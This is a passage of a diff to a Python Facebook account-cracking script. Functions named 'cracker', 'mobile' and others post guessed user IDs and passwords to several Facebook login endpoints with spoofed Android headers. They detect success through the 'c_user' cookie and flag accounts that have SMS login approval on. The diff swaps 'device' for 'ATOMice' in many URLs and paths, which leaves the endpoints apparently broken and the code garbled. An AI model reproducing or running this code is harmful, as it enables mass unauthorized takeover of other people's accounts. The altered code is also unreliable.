+            url = "https://m.facebook.com/login/ATOMice-based/login/async/?api_key=274266067164&auth_token=5632b47aa47bd661d18b53714ed804a9&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727857109841%26e2e%3D%257B%2522init%2522%253A1727857109841%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3De811d7a5-1c58-4736-a373-62736184ad5a%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D47cGdAHirRSZ9MdP8XILUi0QQAmFaJso9L9EzgmLG9Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da637c4fc-08cb-47c0-9f86-43029b0b9b37%26tp%3Dunspecified&refsrc=deprecated&app_id=274266067164&cancel=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1452,7 +1487,7 @@ def x(uid,pwx,tl):
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'next': 'https://m.facebook.com/login/save-device/',
+            'next': 'https://m.facebook.com/login/save-ATOMice/',
             'flow': 'login_no_pin',
             'pass': pw,
             'login': 'Log in'}
@@ -1460,7 +1495,7 @@ def x(uid,pwx,tl):
             'Host': 'd.facebook.com',
             'Connection': 'keep-alive',
             'sec-ch-ua-platform': '"Android"',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_Device) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_ATOMice) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
             'sec-ch-ua': '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
@@ -1472,7 +1507,7 @@ def x(uid,pwx,tl):
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': 'en,en-US;q=0.9'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://d.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://d.facebook.com/login/ATOMice-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1554,7 +1589,7 @@ def mobile(uid,pwx,tl):
             headers = {
             'Host': 'business.facebook.com',
             'method': 'POST',
-            'path': '/login/Device-based/login/async/',
+            'path': '/login/ATOMice-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1582,7 +1617,7 @@ def mobile(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            url = "https://business.facebook.com/login/ATOMice-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1650,7 +1685,7 @@ def freeq(uid,pwx,tl):
             headers = {
             'Host': 'm.facebook.com',
             'method': 'POST',
-            'path': '/login/Device-based/login/async/',
+            'path': '/login/ATOMice-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1779,7 +1814,7 @@ def d(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate',
             'accept-language': 'id-ID, id;q=0.9, en-GB;q=0.8, en;q=0.7,en-US;q=0.6'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/ATOMice-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2043,7 +2078,7 @@ def cracker(uid, pwx, tl):
             headers = {
             'Host': 'p.facebook.com',
             'method': 'POST',
-            'path': '/login/Device-based/login/async/',
+            'path': '/login/ATOMice-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -2071,7 +2106,7 @@ def cracker(uid, pwx, tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/ATOMice-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
